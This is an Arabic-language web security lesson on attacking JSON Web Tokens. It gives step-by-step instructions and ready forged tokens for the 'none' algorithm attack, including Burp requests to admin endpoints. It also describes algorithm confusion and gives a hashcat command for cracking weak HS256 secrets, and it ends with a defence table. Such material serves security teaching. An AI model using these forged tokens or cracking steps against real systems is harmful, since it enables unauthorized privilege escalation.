# JWT Attacks — من الفكرة للتنفيذ

---

## الصورة الكبيرة — الـ JWT إيه وليه بنهاجمه؟

اتكلمنا في المحاضرة إن الـ Sessions بتتخزن في Cookies على السيرفر. الـ **JWT** (JSON Web Token) — النطق: **جيه-دبليو-تي** — فكرته مختلفة.

بدل ما السيرفر يحتفظ بالـ session عنده — بيبعت كل المعلومات للـ client في Token. وكل request الـ client بيبعت الـ Token ده للسيرفر يتحقق منه.

> الفكرة الجوهرية: الـ JWT بيحمل معلومات زي `role=user` أو `admin=false` — لو السيرفر مش بيتحقق من الـ Token صح، الـ attacker يقدر يعدل فيه ويرفع صلاحياته.

---

## تركيب الـ JWT — 3 أجزاء

الـ JWT شكله كده:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

3 أجزاء مفصولة بـ نقطة `.`:

```
HEADER . PAYLOAD . SIGNATURE
```

---

### الجزء الأول — Header (الرأس)

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

بيقول:

- `alg` —
- الـ **Algorithm** (الخوارزمية) المستخدمة في التوقيع — النطق: **ألجوريذم**
- `typ` — نوع الـ Token

---

### الجزء التاني — Payload (الحمولة)

```json
{
  "sub": "1234567890",
  "user": "john",
  "role": "user",
  "admin": false,
  "exp": 1716454560
}
```

فيه الـ **Claims** (المطالبات / البيانات) — النطق: **كليمز** — يعني المعلومات عن الـ user.

> **مهم جداً:** الـ Payload مش مشفر — بس **Base64 encoded** — يعني أي حد يقدر يقراه!

---

### الجزء التالت — Signature (التوقيع)

```
HMACSHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)
```

ده الجزء اللي بيأمن الـ Token — السيرفر بيعمله بـ **Secret Key** (مفتاح سري) عنده بس.

الهدف: لو حد عدّل في الـ Payload — الـ Signature هتبقى غلط والسيرفر هيرفضه.

---

## إزاي تحلل JWT في Burp + jwt.io

### الخطوة 1 — لاقي الـ JWT

الـ JWT بيبقى في:

- الـ **Authorization Header:** `Authorization: Bearer eyJhbG...`
- الـ **Cookie:** `token=eyJhbG...`

في Burp — HTTP History — ابص في الـ Request headers بعد الـ login.

### الخطوة 2 — حللّه على jwt.io

**jwt.io** هو موقع مجاني بيفكك الـ JWT ويعرضه بشكل مقروء.

1. روح على `https://jwt.io`
2. الصق الـ Token في الـ Encoded box
3. هتشوف الـ Header والـ Payload محللين على طول

### الخطوة 3 — ابص على الـ Payload

دور على:

- `role` أو `admin` أو `isAdmin` أو `group`
- `exp` — 
- الـ **Expiration** (انتهاء الصلاحية) — النطق: **إكسبيريشن** — لو فات التاريخ → ممكن يكون في ثغرة
- `alg`
- في الـ Header — لو `HS256` → اختبر الـ None Algorithm Attack

---

## هجوم الـ None Algorithm — أخطر ثغرة في JWT

### الفكرة:

بعض الـ JWT libraries قديمة بتقبل الـ algorithm قيمته `none` — يعني **مفيش signature** — والسيرفر بيقبل الـ Token من غير ما يتحقق من أي حاجة!

### الخطوات عملياً:

**الخطوة 1 — خد الـ JWT الأصلي:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**الخطوة 2 — افكك الـ Header وعدّل الـ Algorithm:**

الـ Header الأصلي بعد Base64 Decode:

```json
{"alg":"HS256","typ":"JWT"}
```

عدّله لـ:

```json
{"alg":"none","typ":"JWT"}
```

اعمل Base64 Encode تاني:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

**الخطوة 3 — افكك الـ Payload وعدّل:**

الـ Payload الأصلي:

```json
{"user":"john","role":"user"}
```

عدّله لـ:

```json
{"user":"john","role":"admin"}
```

اعمل Base64 Encode:

```
eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9
```

**الخطوة 4 — ركّب الـ Token الجديد بدون Signature:**

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
```

**لاحظ:** النقطة الأخيرة موجودة بس بعدها فاضي — مفيش Signature.

**الخطوة 5 — ابعت الـ Token الجديد في Burp Repeater:**

```http
GET /admin HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
```

**لو السيرفر vulnerable → هيقبل الـ Token ويعطيك Admin access!**

---

## الـ JWT Editor في Burp

الـ **Burp Suite Professional** عنده extension اسمه **JWT Editor** — النطق: **جيه-دبليو-تي إيديتور** — بيخلي كل العملية دي أسهل بكتير.

**الخطوات:**

1. في Burp — روح **Extensions → BApp Store** → ابحث عن **JWT Editor** → Install
2. امسك أي request فيه JWT
3. في الـ Request — هتلاقي tab جديد اسمه **JSON Web Token**
4. اضغط عليه — هتشوف الـ Header والـ Payload جاهزين للتعديل
5. عدّل الـ Payload زي ما تحب
6. اضغط **Attack → None Signing Algorithm**
7. Burp هيعمل الـ None Algorithm Attack تلقائياً

---

## هجوم تاني — Algorithm Confusion (HS256 vs RS256)

### الفكرة:

بعض الـ apps بتستخدم **RS256** — النطق: **آر-إس-تو-فيف-سيكس** — وده **Asymmetric Algorithm** (خوارزمية غير متماثلة) — النطق: **أسيمتريك ألجوريذم** — يعني فيه مفتاحين:

- **Private Key** (مفتاح خاص): السيرفر بيوقّع بيه
- **Public Key** (مفتاح عام): أي حد يقدر يقراه

**الهجوم:** لو غيّرت الـ `alg` من `RS256` لـ `HS256` ووقّعت الـ Token بالـ **Public Key** (اللي إنت عارفه) — بعض السيرفرات بتتوهّق وبتتحقق من الـ Signature بالـ Public Key بدل الـ Private Key!

---

## هجوم تالت — JWT Brute Force (كسر الـ Secret Key)

### الفكرة:

لو الـ algorithm هو `HS256` — والـ Secret Key ضعيف — ممكن تكسره بالـ Brute Force.

**الأداة: hashcat** — النطق: **هاش-كات**

```bash
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt
```

- `-m 16500` : نوع الـ hash — ده الكود الخاص بـ JWT في hashcat
- `-a 0` : Dictionary Attack

لو الـ Secret Key كان `secret123` أو `password` → hashcat هيلاقيه في ثواني.

لو لقيت الـ Secret Key — تقدر توقّع أي JWT بيه وتعمل أي تعديل تحبه!

---

## سيناريو كامل — JWT None Algorithm Attack

**الهدف:** `http://target.com`

**الخطوة 1:** Login بـ `john:password123` — امسك الـ response في Burp.

**الخطوة 2:** في الـ response:

```http
HTTP/1.1 200 OK
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.xxxxx
```

**الخطوة 3:** روح jwt.io وحلّل الـ Token:

```json
Header:  {"alg":"HS256"}
Payload: {"user":"john","role":"user"}
```

**الخطوة 4:** عدّل وركّب Token جديد:

```json
Header:  {"alg":"none"}
Payload: {"user":"john","role":"admin"}
```

**الخطوة 5:** في Burp Repeater — بعت request للـ admin panel بالـ Token الجديد:

```http
GET /admin/panel HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
```

**الـ Response:**

```http
HTTP/1.1 200 OK
Welcome to Admin Panel, john!
```

---

## الدفاع — إزاي السيرفر يحمي الـ JWT

|الثغرة|الحل|
|---|---|
|None Algorithm مقبول|رفض أي Token مش موقّع|
|Secret Key ضعيف|Secret Key طويل وعشوائي (32+ character)|
|الـ Payload مش متشيك|التحقق من كل claim على السيرفر|
|مفيش Expiration|إضافة `exp` claim لكل Token|
|مفيش Algorithm check|السيرفر يحدد الـ algorithm هو ومش يقبل غيره|

---

## مصطلحات الدرس

|English Term|المعنى|النطق|
|---|---|---|
|JWT|رمز JSON للويب|جيه-دبليو-تي|
|Algorithm|الخوارزمية المستخدمة في التوقيع|ألجوريذم|
|Claims|البيانات المخزنة في الـ Payload|كليمز|
|Signature|التوقيع الرقمي للـ Token|سيجنيتشر|
|None Algorithm|خوارزمية بلا توقيع — أخطر ثغرة في JWT|—|
|Expiration|انتهاء صلاحية الـ Token|إكسبيريشن|
|Asymmetric Algorithm|خوارزمية بمفتاحين مختلفين|أسيمتريك ألجوريذم|
|Private Key|المفتاح الخاص — للتوقيع فقط|برايفيت كي|
|Public Key|المفتاح العام — للتحقق|بابليك كي|
|HS256|خوارزمية HMAC بـ SHA-256|إتش-إس-تو-فيف-سيكس|
|RS256|خوارزمية RSA بـ SHA-256|آر-إس-تو-فيف-سيكس|
|JWT Editor|extension في Burp لتعديل JWT|جيه-دبليو-تي إيديتور|
|hashcat|أداة كسر الـ hashes والـ Secret Keys|هاش-كات|
|Privilege Escalation|رفع الصلاحيات|بريفيليج إيسكاليشن|
|Bearer Token|نوع Token بيتبعت في الـ Authorization header|بيرر توكن|

---

## ملخص الفكرة العملية

> الـ JWT ضعيف لما السيرفر بيثق في المعلومات اللي جوا الـ Token من غير ما يتحقق من الـ Signature صح. أهم هجوم هو الـ **None Algorithm** — بتغير الـ `alg` لـ `none` وبتمسح الـ Signature — لو السيرفر مش بيتشيك → دخلت بأي صلاحيات عايزها. الأداة الأساسية هي **jwt.io** للتحليل و**Burp JWT Editor** للهجوم.

---

**الخطوة الجاية:** OAuth Attacks — آخر موضوع في المحاضرة.

نكمل؟